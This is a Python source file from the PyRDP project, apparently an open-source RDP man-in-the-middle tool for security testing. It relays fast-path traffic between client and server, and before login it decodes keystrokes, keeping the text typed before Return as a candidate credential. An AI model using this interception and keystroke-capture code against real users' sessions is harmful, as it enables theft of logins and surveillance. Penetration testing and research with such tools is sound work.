#
# This file is part of the PyRDP project.
# Copyright (C) 2019 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from pyrdp.layer import FastPathLayer
from pyrdp.mitm.state import RDPMITMState
from pyrdp.pdu import FastPathPDU, FastPathScanCodeEvent
from pyrdp.player.keyboard import getKeyName

class FastPathMITM:
    """
    MITM component for the fast-path layer.
    """

    def __init__(self, client: FastPathLayer, server: FastPathLayer, state: RDPMITMState):
        """
        :param client: fast-path layer for the client side
        :param server: fast-path layer for the server side
        :param state: the MITM state.
        """

        self.client = client
        self.server = server
        self.state = state

        self.client.createObserver(
            onPDUReceived = self.onClientPDUReceived,
        )

        self.server.createObserver(
            onPDUReceived = self.onServerPDUReceived,
        )

    def onClientPDUReceived(self, pdu: FastPathPDU):
        if self.state.forwardInput:
            self.server.sendPDU(pdu)

        if not self.state.loggedIn:
            for event in pdu.events:
                if isinstance(event, FastPathScanCodeEvent):
                    self.onScanCode(event.scanCode, event.isReleased, event.rawHeaderByte & 2 != 0)

    def onServerPDUReceived(self, pdu: FastPathPDU):
        if self.state.forwardOutput:
            self.client.sendPDU(pdu)

    def onScanCode(self, scanCode: int, isReleased: bool, isExtended: bool):
        """
        Handle scan code.
        """
        keyName = getKeyName(scanCode, isExtended, self.state.shiftPressed, self.state.capsLockOn)

        if len(keyName) == 1:
            if not isReleased:
                self.state.inputBuffer += keyName

        # Left or right shift
        if scanCode in [0x2A, 0x36]:
            self.state.shiftPressed = not isReleased

        # Caps lock
        elif scanCode == 0x3A and not isReleased:
            self.state.capsLockOn = not self.state.capsLockOn

        # Return
        elif scanCode == 0x1C and not isReleased:
            self.state.candidate = self.state.inputBuffer
            self.state.inputBuffer = ""